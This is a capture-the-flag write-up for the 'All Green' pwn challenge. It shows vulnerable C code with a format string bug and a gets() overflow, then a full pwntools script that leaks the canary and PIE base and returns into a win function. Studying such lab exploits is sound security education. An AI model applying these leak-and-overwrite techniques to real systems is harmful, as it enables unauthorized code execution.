# All Green

---

> This problem is greener than grass. (which you should probably go touch)
> 
> nc toady.nyiyui.ca 2000

---

### Static Analysis

Looking at the provided source code, we can see that in the `func` function, there is both a buffer overflow via the `gets` function and a format string vulnerability via the usage of `printf` with no explicit format string. 

```c
void func(){
    printf("Every protection is enabled. Good luck.\n");
    char buf[0x20];
    gets(buf);
    printf(buf);
    printf("\n");
    gets(buf);
}
```

The program also hints to there being all protections enabled for the binary as we can see via the `checksec` command.

```
[*] 'WxMCTF 2023/pwn/All Green/green'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Finally, we have a win function _(albeit there being some additional checks)_ which we can easily return to.

### Exploit Strategy

In order to win, we want to call an offset of the win function to read the flag with minimum effort.

Before we can achieve that, we have to first leak our canary and leak the ELF address so that we can bypass both **CANARY** and **PIE**.

By doing some trial and error, we can find our offsets of `main+81` and `canary` to be at `%19$p` and `%15$p` respectively.

If we look at the disassembly of `finalcheck`, we want to find an address that is just before the `getenv` and after the whole bunch of annoying checks.

```
   0x5655634d <+73>:    lea    eax,[ebx-0x1fac]
   0x56556353 <+79>:    push   eax
   0x56556354 <+80>:    call   0x56556110 <getenv@plt>
   0x56556359 <+85>:    add    esp,0x10
   0x5655635c <+88>:    mov    DWORD PTR [ebp-0xc],eax
```

which we can find to be `finalcheck+73` which sets up the argument to `getenv`.

Finally, we also need to fix up `EBX` and `EBP` values before returning to `finalcheck+73` since `EBX` is used as a function pointer and `EBP` is needed to store variables on the stack.

We can write our exploit code as such

```python
from pwn import *

elf = ELF("./green")
p = process("./green")

p.sendline(b"%15$p.%19$p")
p.recvline()

# resolve leaks
canary, leak = [int(i, 16) for i in p.recvline().strip().split(b".")]
elf.address = leak - 81 - elf.sym.main

if args.GDB:
    gdb.attach(p)

payload = fit(
    {
        0x20: p32(canary),                      # FIX CANARY
        0x28: p32(elf.address + 0x3fb4),         # FIX EBX
        0x2C: p32(elf.address + 0x4200),        # FIX EBP
        0x30: p32(elf.sym.finalcheck + 73),     # WIN
    }
)
p.sendline(payload)

p.interactive()
```
